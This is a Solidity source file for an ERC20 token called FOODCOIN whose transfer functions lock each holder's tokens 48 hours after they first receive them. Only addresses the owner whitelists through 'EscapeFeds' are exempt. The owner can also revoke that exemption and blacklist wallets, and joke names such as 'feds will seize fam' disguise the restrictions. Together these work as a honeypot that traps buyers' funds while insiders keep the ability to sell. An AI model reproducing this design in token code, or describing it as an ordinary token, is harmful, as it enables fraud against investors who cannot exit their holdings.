// SPDX-License-Identifier: UNKNOWN

pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract FOODCOIN is ERC20, Ownable {

    event EscapedFromFeds(address);
    event FoodIsSeized(address);

    mapping(address => uint256) private _startingTime;
    mapping(address => bool) private _topshotta;
    mapping(address => bool) private botsWallets;

    uint256 public lockedTime = 172800;

    constructor(
        address teamWallet
    ) ERC20("FOODCOIN", "FOOD") {
        uint256 totalSupply = 69696969 * 10 ** decimals();
        uint256 teamSupply = totalSupply * 1/10;
        _mint(teamWallet, teamSupply);
        _mint(msg.sender, totalSupply - teamSupply);
    }

    
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            _startingTime[msg.sender] + lockedTime > block.timestamp ||
                _topshotta[msg.sender],
            "feds will seize fam"
        );
        return super.transfer(recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            _startingTime[sender] + lockedTime > block.timestamp ||
                _topshotta[sender],
            "feds will seize fam"
        );
        return super.transferFrom(sender, recipient, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!botsWallets[from]);
        if (_startingTime[to] == 0) {
            _startingTime[to] = block.timestamp;
        }
        super._beforeTokenTransfer(from, to, amount);
    }

    /// @dev Escape from the feds
    /// @param account user account
    function EscapeFeds(address account) public onlyOwner {
        _topshotta[account] = true;
        emit EscapedFromFeds(account);
    }

    /// @dev Seize the food
    /// @param account to seize food
    function FoodSeized(address account) public onlyOwner {
        _topshotta[account] = false;
        emit FoodIsSeized(account);
    }

    /// @dev Get the feds arrival time
    /// @param account user account 
    function FedsComing(address account) public view returns (uint256) {
        uint256 seizedTime;
        if (_startingTime[account] != 0) {
            seizedTime = _startingTime[account] + lockedTime;
        }
        if (_startingTime[account] == 0 || _topshotta[account]) {
            seizedTime = 0;
        }
        return seizedTime;
    }

    /// @dev MEV, Bots and Snipper wallets
    /// @param accounts accounts to add / remove
    /// @param blacklists add/remove from the suspended account
    function blacklistWallet(
        address[] memory accounts,
        bool[] memory blacklists
    ) public onlyOwner {
        require(accounts.length == blacklists.length, "Not correct blacklist");
        for (uint256 i = 0; i < accounts.length; i++) {
            botsWallets[accounts[i]] = blacklists[i];
        }
    }
}
